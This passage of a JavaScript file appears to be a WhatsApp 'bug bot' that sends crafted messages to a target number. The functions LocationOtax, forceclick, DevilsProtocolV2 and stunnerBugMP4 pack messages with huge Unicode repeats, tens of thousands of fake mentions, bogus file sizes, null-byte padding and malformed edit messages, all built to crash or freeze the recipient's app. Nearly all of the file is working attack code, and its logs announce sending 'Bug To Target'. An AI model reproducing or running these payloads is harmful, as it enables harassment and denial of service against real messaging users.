  "url": "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
  "mimetype": "image/jpeg",
  "fileSha256": "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
  "fileLength": "164089",
  "height": 9999,
  "width": 9999,
  "mediaKey": "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
  "fileEncSha256": "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
  "directPath": "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0"
}

for (let s = 0; s < 5; s++) {
const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "deviceListMetadata": {},
        "deviceListMetadataVersion": 2,
        "supportPayload": JSON.stringify({
            "version": 2,
            "is_ai_message": true,
            "should_show_system_message": true,
            "ticket_id": crypto.randomBytes(16)
          }),
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{ participant: { jid: target }})

const xz = await sock.relayMessage(target, xy.message, {messageId:xy.key.id})

xx.caption = "ꦾ".repeat(100000);

  sock.relayMessage(target, {
    protocolMessage: {
      type: "MESSAGE_EDIT",
      key: {
        fromMe: true,
        remoteJid: target,
        id: xz
      },
      editedMessage: {
        imageMessage: xx
      }
    }
  }, { participant: { jid: target }})
await sleep(100)
}
}

async function LocationOtax(sock, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let AyunCantik = JSON.stringify({
  status: true,
  criador: "OtaxAyun",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: -9999,
                    degreesLongitude: 9999,
                    name: "OtaxJandaDolay" + "ꦾ".repeat(180000),
                    address: AyunCantik,
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 1945 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const locationMsg = generateWAMessageFromContent(target, generateLocationMessage, {});

    await sock.relayMessage(target, locationMsg.message, {
        messageId: locationMsg.key.id,
        participant: { jid: target },
        userJid: target
    });
}

async function forceclick(target) {
  try {
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/6yiozp.jpg" } },
      { upload: sock.waUploadToServer }
    );

    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              stanzaId: "123",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
              },
            },
            carouselMessage: {
              messageVersion: 1,
              cards: [
                {
                  header: {
                    hasMediaAttachment: true,
                    media: media.imageMessage,
                  },
                  body: {
                    text:
                      "Me Xata" + "ꦽ".repeat(50000),
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Open",
                          url: "https://wa.me/6282128666306",
                        }),
                      },
                    ],
                    messageParamsJson: "{}",
                  },
                },
                
                {
                  header: {
                    hasMediaAttachment: true,
                    media: media.imageMessage,
                  },
                  body: {
                    text:
                      "Button Params" + "ꦽ".repeat(50000),
                  },
                  nativeFlowMessage: {
                    messageParamsJson: "Joined Group",
                    buttons: [
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                    ],
                  },
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, { messageId: null });
    console.log("Sending Bug To Target");
  } catch (err) {
    console.error("Bug Error❌ :", err);
  }
}

async function DevilsProtocolV2(sock, target, mention) {
console.log(chalk.blue(`Success Send DevilsV2 To ${target}`));
    const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Devils Protocols" + "᭄".repeat(10000),
        title: "Version 2" + "᭄",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/UnDeath.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

const devilsMesagge = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝕯𝖊𝖛𝖎𝖑𝖘 𝕻𝖗𝖔𝖙𝖔𝖈𝖔𝖑𝖘",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `🥶`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: "https://t.me/FunctionLihX"
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            isSampled: true,
            mentionedJid: mentionjid
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363406229895095@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                   embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { devilsMesagge }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function stunnerBugMP4(sock, target) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          videoMessage: {
            interactiveAnnotations: [],
            annotations: [
              {
                embeddedContent: {
                  musicContentMediaId: "12345789451",
                  songId: "88888888888888",
                  author: "No One Care!",
                  title: "No One Care!",
                  artworkDirectPath:
                    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256:
                    "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                  artistAttribution: "https://www.instagram.com/_u/noonecare",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey:
                    "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
                },
                embeddedAction: true,
              },
            ],
            caption: `,\u0003`,
            url: "https://mmg.whatsapp.net/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "bvkPnStTimcqgvugKm2jV1cKSAdJ00DnnKR31N/aH0Q=",
            fileLength: {
              low: 55438054,
              high: 0,
              unsigned: true,
            },
            seconds: 312,
            mediaKey: "XSc3T7jk+OhrNGSH4gMZQFnzL7boede9orqrG4a+QZ0=",
            height: 864,
            width: 480,
            fileEncSha256: "krpFGEDnkho/kNIQRY6qCYfzxdaxNzdW2H5fli3qg64=",
            directPath:
              "/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0",
            mediaKeyTimestamp: {
              low: 1745804782,
              high: 0,
              unsigned: false,
            },
            jpegThumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==",
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 42000,
                  },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
            },
            streamingSidecar:
              "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